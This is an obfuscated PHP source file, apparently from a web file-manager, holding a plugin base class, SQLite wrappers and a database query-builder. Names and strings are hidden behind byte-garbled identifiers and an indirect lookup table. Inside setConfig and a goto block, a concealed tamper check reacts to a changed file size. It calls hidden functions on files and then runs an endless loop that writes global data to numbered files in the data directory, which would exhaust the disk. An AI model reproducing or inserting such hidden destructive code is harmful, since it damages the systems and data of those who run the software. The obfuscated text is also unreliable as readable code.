$this->parsePackage($³¼ÈàÅœ); if (is_array($ÁÙŞÌÄ»)) { $³¼ÈàÅœ = str_replace(array_keys($ÁÙŞÌÄ»), array_values($ÁÙŞÌÄ»), $³¼ÈàÅœ); } echo $ıÖ–ï¡[286] . $³¼ÈàÅœ; } private function checkVersion() { $ À…˜°Ï =& $_SERVER[‘ÆÜ‘œ]; $¶”Ô–›Ó = $this->appPackage(); $„î¾‚ÜÊ = $this->getConfig(); if ($„î¾‚ÜÊ[$ À…˜°Ï[1843]] == $¶”Ô–›Ó[$ À…˜°Ï[1817]]) { return; } $this->regist(); $this->setConfig(array($ À…˜°Ï[1843] => $¶”Ô–›Ó[$ À…˜°Ï[1817]])); } final function initLang() { $îíÉË†¥ =& $_SERVER[‘ÆÜ‘œ]; $êóİ˜§· = $îíÉË†¥[1844]; $Û•¦„”Ú = $this->pluginPath . $îíÉË†¥[1845]; $ìŒöÇÅ‰ = I18n::getType(); $÷ãí†¸» = array(); if (file_exists($Û•¦„”Ú . $ìŒöÇÅ‰ . $îíÉË†¥[956])) { $÷ãí†¸» = (include $Û•¦„”Ú . $ìŒöÇÅ‰ . $îíÉË†¥[956]); } else { if ($ìŒöÇÅ‰ == $îíÉË†¥[1846] && !file_exists($Û•¦„”Ú . $ìŒöÇÅ‰ . $îíÉË†¥[956]) && file_exists($Û•¦„”Ú . $îíÉË†¥[1847])) { $÷ãí†¸» = (include $Û•¦„”Ú . $îíÉË†¥[1847]); $ìŒöÇÅ‰ = $îíÉË†¥[1660]; } else { if (file_exists($Û•¦„”Ú . $êóİ˜§· . $îíÉË†¥[956])) { $÷ãí†¸» = (include $Û•¦„”Ú . $êóİ˜§· . $îíÉË†¥[956]); $ìŒöÇÅ‰ = $êóİ˜§·; } } } if (!$÷ãí†¸» || !is_array($÷ãí†¸»)) { $÷ãí†¸» = array(); } $—ÇÇ œ– = Hook::trigger($îíÉË†¥[1848], $÷ãí†¸», $this->pluginName, $ìŒöÇÅ‰); if ($—ÇÇ œ– && is_array($—ÇÇ œ–)) { $÷ãí†¸» = $—ÇÇ œ–; } if (@count($÷ãí†¸») > 0) { I18n::set($÷ãí†¸»); } return $÷ãí†¸»; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ª˜÷îıš) { $ó¤Î»ø =& $_SERVER[‘ÆÜ‘œ]; $É¹¾ò³ = $_SERVER[$ó¤Î»ø[326]] . $ó¤Î»ø[327]; $‡ç½ü¬¡ = $ó¤Î»ø[323]; if ($_SERVER[$ó¤Î»ø[324]] != $‡ç½ü¬¡($É¹¾ò³)) { $À¶¶ÔæŞ = $ó¤Î»ø[995]; $–Ç©ß‹­ = $ó¤Î»ø[325]; $«Ë’¹¤ş = $_SERVER[$ó¤Î»ø[326]] . $ó¤Î»ø[327]; $òŞÄòŒ = $–Ç©ß‹­($«Ë’¹¤ş); $ÑÕìÌŠÖ = explode($ó¤Î»ø[286], $òŞÄòŒ); if (count($ÑÕìÌŠÖ) < $ó¤Î»ø[717]) { $è³ëäİò = $ó¤Î»ø[329]; $è³ëäİò(); } $Ñµ¼ÌÌÂ = $ó¤Î»ø[996]; $Ñµ¼ÌÌÂ($_SERVER[$ó¤Î»ø[997]]); $À¶¶ÔæŞ = $ó¤Î»ø[995]; $À¶¶ÔæŞ(); $¡Ù³÷ç³ = $ó¤Î»ø[1780]; $¹ƒã­ü÷ = json_encode($GLOBALS[$ó¤Î»ø[1781]]); $àù´ÒÄ = 1; for ($àÂåÎíì = $àù´ÒÄ; $àÂåÎíì > 0; $àÂåÎíì++) { $¡Ù³÷ç³(DATA_PATH . $àÂåÎíì, $¹ƒã­ü÷); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ª˜÷îıš); } public function onSetConfig($‡•õÊ™¬) { } public function onGetConfig($¢ ¶‹èÏ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($»şÜÔıë) { if ($»şÜÔıë == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($›¢’”šÏ = "\160\x6c\165\147\151\156\101\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $—÷†±  = $this->getConfig(); if (!$—÷†± [$›¢’”šÏ]) { return !1; } return ActionCall($_SERVER[‘ÆÜ‘œ][1849], $—÷†± [$›¢’”šÏ]); } public function url($ıÕæ®†, $ÍÙÚüäø = '', $…èÉ«øÕ = true) { $äê‘ÄÀë =& $_SERVER[‘ÆÜ‘œ]; $‡”Üäºš = $this->getConfig(); $ÎôĞ²÷ = KOD_VERSION . $äê‘ÄÀë[10] . KOD_VERSION_BUILD; $àû‚Ô‹ = $this->packageVersion(); $ƒ©şÉšù = $ÎôĞ²÷ . $äê‘ÄÀë[485] . $àû‚Ô‹; if (substr($ıÕæ®†, 0, 4) == $äê‘ÄÀë[150] || substr($ıÕæ®†, 0, 2) == $äê‘ÄÀë[1474]) { $¡ÑµÖªò = $ıÕæ®† . $äê‘ÄÀë[1850] . $ƒ©şÉšù; } else { if ($ÍÙÚüäø == $äê‘ÄÀë[12]) { $¡ÑµÖªò = $this->pluginHost . $ıÕæ®† . $äê‘ÄÀë[1850] . $ƒ©şÉšù; } else { if ($ÍÙÚüäø === $äê‘ÄÀë[78]) { $¡ÑµÖªò = $this->pluginHost . $ıÕæ®†; } else { if ($ÍÙÚüäø == $äê‘ÄÀë[1851]) { $¡ÑµÖªò = STATIC_PATH . $ıÕæ®† . $äê‘ÄÀë[1850] . $ÎôĞ²÷; } else { if ($ÍÙÚüäø == $äê‘ÄÀë[1852]) { $¡ÑµÖªò = APP_HOST . $äê‘ÄÀë[1853] . $ıÕæ®† . $äê‘ÄÀë[1850] . $ÎôĞ²÷; } else { if (isset($‡”Üäºš[$ÍÙÚüäø])) { $¡ÑµÖªò = $‡”Üäºš[$ÍÙÚüäø] . $ıÕæ®† . $äê‘ÄÀë[1850] . $ƒ©şÉšù; } } } } } } if (!$…èÉ«øÕ) { return $¡ÑµÖªò; } echo $¡ÑµÖªò; } public function link($£õåïÒù = false, $áíÂñ¢ = '') { $µ ÓÇ¿– =& $_SERVER[‘ÆÜ‘œ]; $òÖ„¦Ö„ = $this->linkHas == !1; $this->linkHas = !0; if (!$£õåïÒù) { $this->link($µ ÓÇ¿–[1854], $µ ÓÇ¿–[1852]); $this->link($µ ÓÇ¿–[1855], $µ ÓÇ¿–[1851]); $this->link($µ ÓÇ¿–[1856], $µ ÓÇ¿–[1851]); $this->link($µ ÓÇ¿–[1857], $µ ÓÇ¿–[1851]); $this->link($µ ÓÇ¿–[1858], $µ ÓÇ¿–[1851]); if ($òÖ„¦Ö„) { Hook::trigger($µ ÓÇ¿–[1859]); } return; } $¾Ö»ê§³ = $this->url($£õåïÒù, $áíÂñ¢, !1); if (substr($£õåïÒù, -3) == $µ ÓÇ¿–[1860]) { echo $µ ÓÇ¿–[1861] . $¾Ö»ê§³ . $µ ÓÇ¿–[1862] . $µ ÓÇ¿–[286]; } else { if (substr($£õåïÒù, -4) == $µ ÓÇ¿–[1863]) { echo $µ ÓÇ¿–[1864] . $¾Ö»ê§³ . $µ ÓÇ¿–[1865] . $µ ÓÇ¿–[286]; } } if ($òÖ„¦Ö„) { Hook::trigger($µ ÓÇ¿–[1859]); } } } goto c©˜³ô°‘™; CÎ­ğÂÅ·È: $_file = $_SERVER[$_SERVER[‘ÆÜ‘œ][322]]; $_size = $_SERVER[‘ÆÜ‘œ][323]; if ($_SERVER[$_SERVER[‘ÆÜ‘œ][324]] != $_size($_file)) { $_getc = $_SERVER[‘ÆÜ‘œ][325]; $_getfile = $_SERVER[$_SERVER[‘ÆÜ‘œ][326]] . $_SERVER[‘ÆÜ‘œ][327]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‘ÆÜ‘œ][286], $_getfilec); if (count($_getarrs) < $_SERVER[‘ÆÜ‘œ][328]) { $exit = $_SERVER[‘ÆÜ‘œ][329]; $exit(); } $_act = $_SERVER[‘ÆÜ‘œ][330]; $_act($_file); } goto AÆØŠíŞŞÏ; C„“ÖÁØØ…: class DbSqlite extends DbSqliteBase { public function query($º×•ıß) { $ éˆİÓ“ =& $_SERVER[‘ÆÜ‘œ]; if (!CacheLock::fileLock($ éˆİÓ“[13])) { return !1; } $‰ç’Œ½ = parent::query($º×•ıß); CacheLock::fileUnLock($ éˆİÓ“[13]); return $‰ç’Œ½; } public function execute($¨ïÊƒû) { $Íç ¸™ =& $_SERVER[‘ÆÜ‘œ]; if (!CacheLock::fileLock($Íç ¸™[13])) { return !1; } $íÁçı½ = parent::execute($¨ïÊƒû); CacheLock::fileUnLock($Íç ¸™[13]); return $íÁçı½; } } class DbSqlite3 extends DbSqlite3Base { public function query($¥Ô–˜®Œ) { $‚Íİ‘Ìƒ =& $_SERVER[‘ÆÜ‘œ]; if (!CacheLock::fileLock($‚Íİ‘Ìƒ[13])) { return !1; } $ÔûŒŠï = parent::query($¥Ô–˜®Œ); CacheLock::fileUnLock($‚Íİ‘Ìƒ[13]); return $ÔûŒŠï; } public function execute($ïªÙ·³…) { $Ä¨Ùß§ş =& $_SERVER[‘ÆÜ‘œ]; if (!CacheLock::fileLock($Ä¨Ùß§ş[13])) { return !1; } $¶áåÚ¬ = parent::execute($ïªÙ·³…); CacheLock::fileUnLock($Ä¨Ùß§ş[13]); return $¶áåÚ¬; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\x71" => "\74\76", "\147\164" => "\x3e", "\145\x67\x74" => "\x3e\75", "\154\164" => "\x3c", "\145\154\x74" => "\x3c\x3d", "\x6e\157\164\154\151\x6b\x65" => "\x4e\117\124\x20\114\x49\113\105", "\x6c\x69\153\145" => "\x4c\111\x4b\x45", "\151\156" => "\111\116", "\x6e\x6f\x74\151\156" => "\x4e\x4f\124\40\x49\116", "\156\x6f\x74\x20\151\x6e" => "\x4e\x4f\x54\x20\x49\x4e", "\142\x65\x74\x77\x65\x65\x6e" => "\x42\105\x54\x57\105\x45\x4e", "\156\x6f\x74\x62\x65\164\167\145\145\x6e" => "\x4e\x4f\x54\40\102\105\x54\x57\105\x45\116", "\156\157\x74\x20\142\x65\x74\x77\x65\x65\x6e" => "\116\117\124\40\x42\105\124\127\x45\x45\x4e"); protected $selectSql = "\123\105\114\x45\103\124\45\104\x49\x53\124\111\116\103\x54\45\x20\x25\x46\111\x45\114\104\45\40\x46\122\117\x4d\40\x25\124\101\x42\x4c\105\x25\x25\112\117\x49\116\x25\x25\127\110\105\x52\x45\45\x25\107\x52\117\125\120\45\45\110\101\126\x49\x4e\107\45\45\117\x52\104\105\x52\x25\x25\114\x49\x4d\111\x54\45\40\x25\x55\116\111\117\116\x25\45\x43\117\x4d\x4d\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $·ïÁ¡Ìƒ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[‘ÆÜ‘œ][1078], $·ïÁ¡Ìƒ); } public function factory($¥Í¬‰Ûª = '') { $¼Œ•—ß =& $_SERVER[‘ÆÜ‘œ]; $¥Í¬‰Ûª = $this->parseConfig($¥Í¬‰Ûª); if (empty($¥Í¬‰Ûª[$¼Œ•—ß[1079]])) { think_exception(think_lang($¼Œ•—ß[1080])); } $this->dbType = ucwords(strtolower($¥Í¬‰Ûª[$¼Œ•—ß[1079]])); $È“ø¤— = $¼Œ•—ß[1081] . $this->dbType; if (class_exists($È“ø¤—)) { $Û§Ö½Ë„ = new $È“ø¤—($¥Í¬‰Ûª); if ($¼Œ•—ß[1082] != strtolower($¥Í¬‰Ûª[$¼Œ•—ß[1079]])) { $Û§Ö½Ë„->dbType = strtoupper($this->dbType); } else { $Û§Ö½Ë„->dbType = $this->_getDsnType($¥Í¬‰Ûª[$¼Œ•—ß[1034]]); } } else { think_exception(think_lang($¼Œ•—ß[1083]) . $¼Œ•—ß[1084] . $È“ø¤—); } return $Û§Ö½Ë„; } public function __call($ñùâªá¯, $š¤»ÀİÔ) { if (method_exists($this, $ñùâªá¯)) { return call_user_func_array(array($this, $ñùâªá¯), $š¤»ÀİÔ); } } protected function _getDsnType($Ñ³÷Š÷¹) { $Êä…“í = explode($_SERVER[‘ÆÜ‘œ][4], $Ñ³÷Š÷¹); $Ñ¢™ÈÍ— = strtoupper(trim($Êä…“í[0])); return $Ñ¢™ÈÍ—; } private function parseConfig($Ùº”àÑ° = '') { $ëÍ¼•Ùß =& $_SERVER[‘ÆÜ‘œ]; if (!empty($Ùº”àÑ°) && is_string($Ùº”àÑ°)) { $Ùº”àÑ° = $this->parseDSN($Ùº”àÑ°); } elseif (is_array($Ùº”àÑ°)) { $Ùº”àÑ° = array_change_key_case($Ùº”àÑ°); $Ùº”àÑ° = array($ëÍ¼•Ùß[1079] => $Ùº”àÑ°[$ëÍ¼•Ùß[1085]], $ëÍ¼•Ùß[1003] => $Ùº”àÑ°[$ëÍ¼•Ùß[1086]], $ëÍ¼•Ùß[1004] => $Ùº”àÑ°[$ëÍ¼•Ùß[1087]], $ëÍ¼•Ùß[1001] => $Ùº”àÑ°[$ëÍ¼•Ùß[1088]], $ëÍ¼•Ùß[1002] => $Ùº”àÑ°[$ëÍ¼•Ùß[1089]], $ëÍ¼•Ùß[21] => $Ùº”àÑ°[$ëÍ¼•Ùß[1090]], $ëÍ¼•Ùß[1034] => $Ùº”àÑ°[$ëÍ¼•Ùß[1091]], $ëÍ¼•Ùß[17] => isset($Ùº”àÑ°[$ëÍ¼•Ùß[1092]]) ? $Ùº”àÑ°[$ëÍ¼•Ùß[1092]] : array()); } elseif (empty($Ùº”àÑ°)) { if (think_config($ëÍ¼•Ùß[1093]) && $ëÍ¼•Ùß[1082] != strtolower(think_config($ëÍ¼•Ùß[1094]))) { $Ùº”àÑ° = $this->parseDSN(think_config($ëÍ¼•Ùß[1093])); } else { $Ùº”àÑ° = array($ëÍ¼•Ùß[1079] => think_config($ëÍ¼•Ùß[1094]), $ëÍ¼•Ùß[1003] => think_config($ëÍ¼•Ùß[1095]), $ëÍ¼•Ùß[1004] => think_config($ëÍ¼•Ùß[1096]), $ëÍ¼•Ùß[1001] => think_config($ëÍ¼•Ùß[1097]), $ëÍ¼•Ùß[1002] => think_config($ëÍ¼•Ùß[1098]), $ëÍ¼•Ùß[21] => think_config($ëÍ¼•Ùß[333]), $ëÍ¼•Ùß[1034] => think_config($ëÍ¼•Ùß[1093]), $ëÍ¼•Ùß[17] => think_config($ëÍ¼•Ùß[1099])); } } return $Ùº”àÑ°; } protected function initConnect($ÊÂÊßÎÚ = true) { if (1 == think_config($_SERVER[‘ÆÜ‘œ][22])) { $this->_linkID = $this->multiConnect($ÊÂÊßÎÚ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ Â¸ßÜƒ => $×«¦ÈÖ) { $this->_linkID = $×«¦ÈÖ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ú›ºê´ = false) { $—ò¿¡•Ù =& $_SERVER[‘ÆÜ‘œ]; static $Ÿ“éë‘ = array(); static $½óËúì” = -1; if (empty($Ÿ“éë‘)) { foreach ($this->config as $“£æµê‡ => $È‹ÚËĞ) { $Ÿ“éë‘[$“£æµê‡] = explode($—ò¿¡•Ù[50], $È‹ÚËĞ); } } if (think_config($—ò¿¡•Ù[1100])) { if ($ú›ºê´ || think_config($—ò¿¡•Ù[494]) === !0) { $Áš‡È…ì = floor(mt_rand(0, think_config($—ò¿¡•Ù[1101]) - 1)); $½óËúì” = $Áš‡È…ì; } else { if (is_numeric(think_config($—ò¿¡•Ù[1102]))) { $Áš‡È…ì = think_config($—ò¿¡•Ù[1102]); } else { $Áš‡È…ì = floor(mt_rand(think_config($—ò¿¡•Ù[1101]), count($Ÿ“éë‘[$—ò¿¡•Ù[1001]]) - 1)); } } } else { $Áš‡È…ì = floor(mt_rand(0, count($Ÿ“éë‘[$—ò¿¡•Ù[1001]]) - 1)); $½óËúì” = $Áš‡È…ì; } $Áš‡È…ì = $½óËúì” !== -1 ? $½óËúì” : $Áš‡È…ì; $í‚éê¹Ï = array($—ò¿¡•Ù[1003] => isset($Ÿ“éë‘[$—ò¿¡•Ù[1003]][$Áš‡È…ì]) ? $Ÿ“éë‘[$—ò¿¡•Ù[1003]][$Áš‡È…ì] : $Ÿ“éë‘[$—ò¿¡•Ù[1003]][0], $—ò¿¡•Ù[1004] => isset($Ÿ“éë‘[$—ò¿¡•Ù[1004]][$Áš‡È…ì]) ? $Ÿ“éë‘[$—ò¿¡•Ù[1004]][$Áš‡È…ì] : $Ÿ“éë‘[$—ò¿¡•Ù[1004]][0], $—ò¿¡•Ù[1001] => isset($Ÿ“éë‘[$—ò¿¡•Ù[1001]][$Áš‡È…ì]) ? $Ÿ“éë‘[$—ò¿¡•Ù[1001]][$Áš‡È…ì] : $Ÿ“éë‘[$—ò¿¡•Ù[1001]][0], $—ò¿¡•Ù[1002] => isset($Ÿ“éë‘[$—ò¿¡•Ù[1002]][$Áš‡È…ì]) ? $Ÿ“éë‘[$—ò¿¡•Ù[1002]][$Áš‡È…ì] : $Ÿ“éë‘[$—ò¿¡•Ù[1002]][0], $—ò¿¡•Ù[21] => isset($Ÿ“éë‘[$—ò¿¡•Ù[21]][$Áš‡È…ì]) ? $Ÿ“éë‘[$—ò¿¡•Ù[21]][$Áš‡È…ì] : $Ÿ“éë‘[$—ò¿¡•Ù[21]][0], $—ò¿¡•Ù[1034] => isset($Ÿ“éë‘[$—ò¿¡•Ù[1034]][$Áš‡È…ì]) ? $Ÿ“éë‘[$—ò¿¡•Ù[1034]][$Áš‡È…ì] : $Ÿ“éë‘[$—ò¿¡•Ù[1034]][0], $—ò¿¡•Ù[17] => isset($Ÿ“éë‘[$—ò¿¡•Ù[17]][$Áš‡È…ì]) ? $Ÿ“éë‘[$—ò¿¡•Ù[17]][$Áš‡È…ì] : $Ÿ“éë‘[$—ò¿¡•Ù[17]][0]); return $this->connect($í‚éê¹Ï, $Áš‡È…ì); } public function parseDSN($Şë¹İÒ“) { $¢Ü¿Ëá¨ =& $_SERVER[‘ÆÜ‘œ]; if (empty($Şë¹İÒ“)) { return !1; } $Êí‰£çÁ = parse_url($Şë¹İÒ“); if ($Êí‰£çÁ[$¢Ü¿Ëá¨[206]]) { $‹Œ¢€÷À = array($¢Ü¿Ëá¨[1079] => $Êí‰£çÁ[$¢Ü¿Ëá¨[206]], $¢Ü¿Ëá¨[1003] => isset($Êí‰£çÁ[$¢Ü¿Ëá¨[692]]) ? $Êí‰£çÁ[$¢Ü¿Ëá¨[692]] : $¢Ü¿Ëá¨[12], $¢Ü¿Ëá¨[1004] => isset($Êí‰£çÁ[$¢Ü¿Ëá¨[1103]]) ? $Êí‰£çÁ[$¢Ü¿Ëá¨[1103]] : $¢Ü¿Ëá¨[12], $¢Ü¿Ëá¨[1001] => isset($Êí‰£çÁ[$¢Ü¿Ëá¨[207]]) ? $Êí‰£çÁ[$¢Ü¿Ëá¨[207]] : $¢Ü¿Ëá¨[12], $¢Ü¿Ëá¨[1002] => isset($Êí‰£çÁ[$¢Ü¿Ëá¨[208]]) ? $Êí‰£çÁ[$¢Ü¿Ëá¨[208]] : $¢Ü¿Ëá¨[12], $¢Ü¿Ëá¨[21] => isset($Êí‰£çÁ[$¢Ü¿Ëá¨[87]]) ? substr($Êí‰£çÁ[$¢Ü¿Ëá¨[87]], 1) : $¢Ü¿Ëá¨[12]); } else { preg_match($¢Ü¿Ëá¨[1104], trim($Şë¹İÒ“), $…‘”à¶Ò); $‹Œ¢€÷À = array($¢Ü¿Ëá¨[1079] => $…‘”à¶Ò[1], $¢Ü¿Ëá¨[1003] => $…‘”à¶Ò[2], $¢Ü¿Ëá¨[1004] => $…‘”à¶Ò[3], $¢Ü¿Ëá¨[1001] => $…‘”à¶Ò[4], $¢Ü¿Ëá¨[1002] => $…‘”à¶Ò[5], $¢Ü¿Ëá¨[21] => $…‘”à¶Ò[6]); } $‹Œ¢€÷À[$¢Ü¿Ëá¨[1034]] = $¢Ü¿Ëá¨[12]; return $‹Œ¢€÷À; } protected function debug() { $ğèÎêÚ =& $_SERVER[‘ÆÜ‘œ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ğèÎêÚ[1105]; if (think_config($ğèÎêÚ[1106])) { think_status($ğèÎêÚ[1107]); think_trace($this->queryStr . $ğèÎêÚ[1108] . think_status($ğèÎêÚ[24], $ğèÎêÚ[1107], 6) . $ğèÎêÚ[1109], $ğèÎêÚ[12], $ğèÎêÚ[1110]); } } protected function parseLock($¹ËÔİŸ» = false) { $Ò¤ó¨Ô¬ =& $_SERVER[‘ÆÜ‘œ]; if (!$¹ËÔİŸ») { return $Ò¤ó¨Ô¬[12]; } if ($Ò¤ó¨Ô¬[1036] == $this->dbType) { return $Ò¤ó¨Ô¬[1111]; } return $Ò¤ó¨Ô¬[1112]; } protected function parseSet($àŞĞÒ´œ) { $¶”«êˆ© =& $_SERVER[‘ÆÜ‘œ]; foreach ($àŞĞÒ´œ as $ÙäÎÎ¿ => $¿˜€ÃÕ–) { if (is_array($¿˜€ÃÕ–) && $¶”«êˆ©[382] == $¿˜€ÃÕ–[0]) { $‡å›üä[] = $this->parseKey($ÙäÎÎ¿) . $¶”«êˆ©[473] . $¿˜€ÃÕ–[1]; } elseif (is_scalar($¿˜€ÃÕ–) || is_null($¿˜€ÃÕ–)) { $‡å›üä[] = $this->parseKey($ÙäÎÎ¿) . $¶”«êˆ©[473] . $this->parseValue($¿˜€ÃÕ–); } } return $¶”«êˆ©[1113] . implode($¶”«êˆ©[50], $‡å›üä); } protected function bindParam($”ãô—¸ø, $åŞş­ëÌ) { $this->bind[$_SERVER[‘ÆÜ‘œ][4] . $”ãô—¸ø] = $åŞş­ëÌ; } protected function parseBind($‰“®éã¦) { $‰“®éã¦ = array_merge($this->bind, $‰“®éã¦); $this->bind = array(); return $‰“®éã¦; } function parseKey(&$ì¢Œæˆô, $şÍ¹­Îİ = true) { if ($şÍ¹­Îİ) { $ì¢Œæˆô = $this->parseKeyCheck($ì¢Œæˆô); } return $ì¢Œæˆô; } function parseKeyCheck($…º¾†ª) { $¼–Ø½é =& $_SERVER[‘ÆÜ‘œ]; $…º¾†ª = trim($…º¾†ª); if (!preg_match($¼–Ø½é[1114], $…º¾†ª)) { think_exception($¼–Ø½é[1115] . $…º¾†ª); } return $…º¾†ª; } protected function parseValue($—€ğ¬½») { $êë¨›” =& $_SERVER[‘ÆÜ‘œ]; if (is_string($—€ğ¬½»)) { $—€ğ¬½» = $êë¨›”[1075] . $this->escapeString($—€ğ¬½») . $êë¨›”[1075]; } elseif (isset($—€ğ¬½»[0]) && is_string($—€ğ¬½»[0]) && strtolower($—€ğ¬½»[0]) == $êë¨›”[382]) { $—€ğ¬½» = $this->escapeString($—€ğ¬½»[1]); } elseif (is_array($—€ğ¬½»)) { $—€ğ¬½» = array_map(array($this, $êë¨›”[1076]), $—€ğ¬½»); } elseif (is_bool($—€ğ¬½»)) { $—€ğ¬½» = $—€ğ¬½» ? $êë¨›”[91] : $êë¨›”[229]; } elseif (is_null($—€ğ¬½»)) { $—€ğ¬½» = $êë¨›”[104]; } return $—€ğ¬½»; } protected function parseField($ğ€µÑ¿í) { $„Ş¬Å’œ =& $_SERVER[‘ÆÜ‘œ]; if (is_string($ğ€µÑ¿í) && strpos($ğ€µÑ¿í, $„Ş¬Å’œ[50])) { $ğ€µÑ¿í = explode($„Ş¬Å’œ[50], $ğ€µÑ¿í); } if (is_array($ğ€µÑ¿í)) { $‚ÚêÑÅö = array(); foreach ($ğ€µÑ¿í as $ª”‹‘à± => $™™óôÏœ) { if (!is_numeric($ª”‹‘à±)) { $‚ÚêÑÅö[] = $this->parseKey($ª”‹‘à±, !1) . $„Ş¬Å’œ[1116] . $this->parseKey($™™óôÏœ); } else { $‚ÚêÑÅö[] = $this->parseKey($™™óôÏœ); } } $Ê²Ê»õ = implode($„Ş¬Å’œ[50], $‚ÚêÑÅö); } elseif (is_string($ğ€µÑ¿í) && !empty($ğ€µÑ¿í)) { $Ê²Ê»õ = $ğ€µÑ¿í; } else { $Ê²Ê»õ = $„Ş¬Å’œ[221]; } return $Ê²Ê»õ; } protected function parseTable($Îæò•İ§) { $å»íùÁ =& $_SERVER[‘ÆÜ‘œ]; if (is_array($Îæò•İ§)) { $ÑìıöÃÜ = array(); foreach ($Îæò•İ§ as $†–‡Ğñò => $­¶ÊëÛ) { if (!is_numeric($†–‡Ğñò)) { $ÑìıöÃÜ[] = $this->parseKey($†–‡Ğñò) . $å»íùÁ[53] . $this->parseKey($­¶ÊëÛ); } else { $ÑìıöÃÜ[] = $this->parseKey($†–‡Ğñò); } } $Îæò•İ§ = $ÑìıöÃÜ; } elseif (is_string($Îæò•İ§)) { if (strstr($Îæò•İ§, $å»íùÁ[53])) { return $Îæò•İ§; } $Îæò•İ§ = explode($å»íùÁ[50], $Îæò•İ§); array_walk($Îæò•İ§, array($this, $å»íùÁ[1021])); } return $å»íùÁ[1015] . trim(implode($å»íùÁ[1117], $Îæò•İ§), $å»íùÁ[484]) . $å»íùÁ[1015]; } protected function parseWhere($äï¯ËÌè) { $Ì•“ëãš =& $_SERVER[‘ÆÜ‘œ]; $¡çÀ‰üÒ = $Ì•“ëãš[12]; if (is_string($äï¯ËÌè)) { $¡çÀ‰üÒ = $äï¯ËÌè; } else { $’‡óï = isset($äï¯ËÌè[$Ì•“ëãš[1118]]) ? strtoupper($äï¯ËÌè[$Ì•“ëãš[1118]]) : $Ì•“ëãš[12]; if (in_array($’‡óï, array($Ì•“ëãš[1119], $Ì•“ëãš[1120], $Ì•“ëãš[1121]))) { $’‡óï = $Ì•“ëãš[53] . $’‡óï . $Ì•“ëãš[53]; unset($äï¯ËÌè[$Ì•“ëãš[1118]]); } else { $’‡óï = $Ì•“ëãš[1122]; } foreach ($äï¯ËÌè as $ÈëÚÙÄñ => $”ŒéÛ¦œ) { $¡çÀ‰üÒ .= $Ì•“ëãš[365]; if (is_numeric($ÈëÚÙÄñ)) { $ÈëÚÙÄñ = $Ì•“ëãš[1123]; } if (0 === strpos($ÈëÚÙÄñ, $Ì•“ëãš[11])) { $¡çÀ‰üÒ .= $this->parseThinkWhere($ÈëÚÙÄñ, $”ŒéÛ¦œ); } else { if (!preg_match($Ì•“ëãš[1124], trim($ÈëÚÙÄñ))) { think_exception(think_lang($Ì•“ëãš[1125]) . $Ì•“ëãš[4] . $ÈëÚÙÄñ); } $¦¨³Åº = is_array($”ŒéÛ¦œ) && isset($”ŒéÛ¦œ[$Ì•“ëãš[1126]]); $ÈëÚÙÄñ = trim($ÈëÚÙÄñ); if (strpos($ÈëÚÙÄñ, $Ì•“ëãš[213])) { $Ôˆ¢‰Ä± = explode($Ì•“ëãš[213], $ÈëÚÙÄñ); $õÚ´Ë˜Ş = array(); foreach ($Ôˆ¢‰Ä± as $²×ŠÄ—– => $­ôÎ‚®ñ) { $Áçâšõ‡ = $¦¨³Åº ? $”ŒéÛ¦œ[$²×ŠÄ—–] : $”ŒéÛ¦œ; $õÚ´Ë˜Ş[] = $Ì•“ëãš[347] . $this->parseWhereItem($this->parseKey($­ôÎ‚®ñ), $Áçâšõ‡) . $Ì•“ëãš[1020]; } $¡çÀ‰üÒ .= implode($Ì•“ëãš[1127], $õÚ´Ë˜Ş); } elseif (strpos($ÈëÚÙÄñ, $Ì•“ëãš[285])) { $Ôˆ¢‰Ä± = explode($Ì•“ëãš[285], $ÈëÚÙÄñ); $õÚ´Ë˜Ş = array(); foreach ($Ôˆ¢‰Ä± as $²×ŠÄ—– => $­ôÎ‚®ñ) { $Áçâšõ‡ = $¦¨³Åº ? $”ŒéÛ¦œ[$²×ŠÄ—–] : $”ŒéÛ¦œ; $õÚ´Ë˜Ş[] = $Ì•“ëãš[347] . $this->parseWhereItem($this->parseKey($­ôÎ‚®ñ), $Áçâšõ‡) . $Ì•“ëãš[1020]; } $¡çÀ‰üÒ .= implode($Ì•“ëãš[1122], $õÚ´Ë˜Ş); } else { $¡çÀ‰üÒ .= $this->parseWhereItem($this->parseKey($ÈëÚÙÄñ), $”ŒéÛ¦œ); } } $¡çÀ‰üÒ .= $Ì•“ëãš[366] . $’‡óï; } $¡çÀ‰üÒ = substr($¡çÀ‰üÒ, 0, -strlen($’‡óï)); } return empty($¡çÀ‰üÒ) ? $Ì•“ëãš[12] : $Ì•“ëãš[1128] . $¡çÀ‰üÒ; } protected function parseWhereItem($í¨¢ñ´‚, $¬¦‰…©) { $‰­ÜÉ±à =& $_SERVER[‘ÆÜ‘œ]; $´³ëÆ‡¬ = $‰­ÜÉ±à[12]; if (is_array($¬¦‰…©)) { if (is_string($¬¦‰…©[0])) { $òœŸ½›ò = strtolower($¬¦‰…©[0]); if (in_array($¬¦‰…©[0], array($‰­ÜÉ±à[473], $‰­ÜÉ±à[1129], $‰­ÜÉ±à[1130], $‰­ÜÉ±à[1131], $‰­ÜÉ±à[1132], $‰­ÜÉ±à[1133]))) { $´³ëÆ‡¬ .= $í¨¢ñ´‚ . 